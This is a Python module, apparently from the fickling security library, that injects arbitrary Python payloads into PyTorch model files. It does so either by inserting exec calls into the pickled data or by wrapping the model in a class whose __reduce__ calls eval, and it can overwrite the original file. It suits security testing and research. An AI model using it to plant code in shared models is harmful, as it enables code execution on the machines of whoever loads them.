import os
import zipfile
from pathlib import Path
from typing import Optional

import torch

from fickling.fickle import Pickled
import fickling.polyglot


class BaseInjection(torch.nn.Module):
    # This class allows you to combine the payload and original model
    def __init__(self, original_model: torch.nn.Module, payload: str):
        super().__init__()
        self.original_model = original_model
        self.payload = payload

    def forward(self, *args, **kwargs):
        return self.original_model(*args, **kwargs)

    def __reduce__(self):
        return eval, (self.payload,)


class PyTorchModelWrapper:
    def __init__(self, path: Path):
        self.path: Path = path
        self._pickled: Optional[Pickled] = None

    @property
    def pickled(self) -> Pickled:
        if self._pickled is None:
            formats = fickling.polyglot.identify_pytorch_file_format(self.path)
            if "PyTorch v1.3" not in formats:
                if "PyTorch v0.1.10" in formats:
                    raise ValueError(
                        "This file may be a PyTorch v0.1.10 file. Try Pickled.load() or StackedPickle.load() instead."
                    )
                else:
                    raise NotImplementedError(
                        "A fickling wrapper and injection method has not been developed for that format. Please raise an issue on our GitHub."
                    )
            with zipfile.ZipFile(self.path, "r") as zip_ref:
                data_pkl_path = next(
                    (name for name in zip_ref.namelist() if name.endswith("/data.pkl")), None
                )
                if data_pkl_path is None:
                    raise ValueError("data.pkl not found in the zip archive")
                with zip_ref.open(data_pkl_path, "r") as pickle_file:
                    self._pickled = Pickled.load(pickle_file)
        return self._pickled

    def inject_payload(
        self, payload: str, output_path: Path, injection: str = "all", overwrite: bool = False
    ) -> None:
        self.output_path = output_path

        if injection == "insertion":
            # This does NOT bypass the weights based unpickler
            pickled = self.pickled

            pickled.insert_python_exec(payload)

            # Create a new ZIP file to store the modified data
            with zipfile.ZipFile(output_path, "w") as new_zip_ref:
                with zipfile.ZipFile(self.path, "r") as zip_ref:
                    for item in zip_ref.infolist():
                        with zip_ref.open(item.filename) as entry:
                            if item.filename.endswith("/data.pkl"):
                                new_zip_ref.writestr(item.filename, pickled.dumps())
                            else:
                                new_zip_ref.writestr(item.filename, entry.read())
        if injection == "combination":
            injected_model = BaseInjection(self.pickled, payload)
            torch.save(injected_model, output_path)
        if overwrite is True:
            # Rename the new file to replace the original file
            Path(output_path).rename(self.path)
            output_path = Path(self.output_path)
            if output_path.exists():
                os.remove(output_path)
